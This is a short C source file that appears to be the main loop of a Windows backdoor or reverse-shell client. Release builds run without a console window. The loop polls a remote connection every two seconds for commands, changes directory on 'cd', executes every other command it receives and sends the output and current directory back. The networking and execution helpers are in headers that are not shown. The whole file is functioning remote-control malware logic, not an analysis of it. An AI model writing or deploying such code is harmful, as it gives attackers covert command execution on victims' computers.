#include <windows.h>

#include "connection.h"
#include "processMgmt.h"

#include "json/json.h"

#ifdef DEBUG
#include <stdio.h>
int main(int argc, char* argv[]) 
#else
int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow)
#endif
{
    initConnection();
    while(TRUE)
    {
        char* cwd = getCwd();
        char* command = getData();

        if(command == NULL)
        {
            Sleep(2000);
            continue;
        }

        if(strlen(command) > 3)
        {
            char temp[4];
            memcpy(temp, command, 3);
            temp[3] = 0x00;
            if( strcmp((const char*) temp, "cd ") == 0 )
            {
                if(!SetCurrentDirectory(command+3))
                {
                    sendData("Error!", cwd);
                }
                else
                {
                    free(cwd);
                    cwd = getCwd();
                    sendData("", cwd);
                }
                free(cwd);
                free(command);
                Sleep(2000);
                continue;
            }
        }

        if (strcmp(command, "give_me_path") == 0)
            sendData("", cwd);
        else {
            char* output = getOutput(command);
            sendData(output, cwd);
        }

        free(cwd);
        free(command);
        Sleep(2000);
    }
    return 0;
}
